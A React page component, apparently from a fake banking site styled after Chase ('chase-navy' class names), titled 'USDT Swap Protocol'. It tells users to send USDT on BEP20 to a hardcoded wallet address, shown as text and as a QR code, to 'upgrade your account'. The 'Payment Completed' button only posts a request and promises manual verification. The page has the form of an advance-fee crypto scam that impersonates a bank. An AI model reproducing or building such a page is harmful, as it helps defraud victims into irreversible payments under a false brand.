import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Copy, CheckCircle2, QrCode, ArrowLeft, ExternalLink } from 'lucide-react';
import api from '../../api/axios';
import Button from '../../components/ui/Button';
import toast from 'react-hot-toast';

const SwapProtocol = () => {
  const navigate = useNavigate();
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);
  const [completed, setCompleted] = useState(false);

  const walletAddress = "0x8d80CE651a91f2679C75A356A8505Bf04710638B";
  const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${walletAddress}`;

  const handleCopy = () => {
    navigator.clipboard.writeText(walletAddress);
    setCopied(true);
    toast.success('Address copied to clipboard');
    setTimeout(() => setCopied(false), 2000);
  };

  const handlePaymentCompleted = async () => {
    setLoading(true);
    try {
      const response = await api.post('?action=create_swap_protocol');
      if (response.data.status === 'success') {
        setCompleted(true);
        toast.success('Swap protocol initiated successfully');
      } else {
        toast.error(response.data.message);
      }
    } catch (error) {
      toast.error('Failed to initiate swap protocol');
    } finally {
      setLoading(false);
    }
  };

  if (completed) {
    return (
      <div className="max-w-2xl mx-auto text-center py-12 px-4">
        <div className="bg-white rounded-3xl border border-chase-border shadow-xl p-10 space-y-6">
          <div className="flex justify-center">
            <div className="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center">
              <CheckCircle2 size={48} />
            </div>
          </div>
          <h1 className="text-3xl font-black text-chase-navy">Request Received!</h1>
          <p className="text-gray-500 text-lg">
            Your USDT Swap Protocol request has been submitted. Our team will verify the transaction and upgrade your account shortly.
          </p>
          <div className="pt-6">
            <Button onClick={() => navigate('/dashboard')} className="w-full py-4">
              Return to Dashboard
            </Button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-2xl mx-auto px-4">
      <button
        onClick={() => navigate(-1)}
        className="flex items-center gap-2 text-gray-500 hover:text-chase-navy mb-6 transition-colors font-medium"
      >
        <ArrowLeft size={20} />
        Back
      </button>

      <div className="text-center mb-8">
        <h1 className="text-3xl font-black text-chase-navy mb-2">USDT Swap Protocol</h1>
        <p className="text-gray-500">Send USDT (BEP20) to the address below to upgrade your account</p>
      </div>

      <div className="bg-white rounded-3xl border border-chase-border shadow-xl overflow-hidden">
        <div className="p-8 space-y-8">
          {/* QR Code Section */}
          <div className="flex flex-col items-center justify-center space-y-4">
            <div className="p-4 bg-gray-50 rounded-2xl border-2 border-dashed border-gray-200">
              <img
                src={qrCodeUrl}
                alt="Wallet QR Code"
                className="w-48 h-48"
              />
            </div>
            <div className="flex items-center gap-2 text-xs font-bold text-chase-blue uppercase tracking-widest">
              <QrCode size={14} />
              Scan QR Code
            </div>
          </div>

          {/* Address Section */}
          <div className="space-y-3">
            <label className="text-sm font-bold text-chase-navy uppercase tracking-wider">USDT BEP20 Address</label>
            <div className="flex items-center gap-2 p-4 bg-chase-light rounded-2xl border border-chase-border group">
              <code className="flex-1 break-all text-sm font-mono font-bold text-chase-navy">
                {walletAddress}
              </code>
              <button
                onClick={handleCopy}
                className="p-2 hover:bg-white rounded-xl text-chase-blue transition-all shadow-sm"
              >
                {copied ? <CheckCircle2 size={20} className="text-green-500" /> : <Copy size={20} />}
              </button>
            </div>
            <p className="text-xs text-amber-600 font-bold flex items-center gap-1">
              <ExternalLink size={12} />
              Ensure you use the Binance Smart Chain (BEP20) network.
            </p>
          </div>

          {/* Instructions */}
          <div className="bg-blue-50 border border-blue-100 rounded-2xl p-6">
            <h3 className="text-chase-navy font-bold mb-2">Instructions:</h3>
            <ul className="text-sm text-gray-600 space-y-2 list-disc pl-4 font-medium">
              <li>Open your crypto wallet (TrustWallet, MetaMask, Binance, etc.)</li>
              <li>Select USDT and choose the BEP20 (BSC) network.</li>
              <li>Send the required amount to the address shown above.</li>
              <li>Once the transaction is successful, click the "Payment Completed" button below.</li>
            </ul>
          </div>

          <Button
            onClick={handlePaymentCompleted}
            loading={loading}
            className="w-full py-4 text-lg shadow-lg shadow-chase-blue/20"
          >
            Payment Completed
          </Button>
        </div>
      </div>
    </div>
  );
};

export default SwapProtocol;
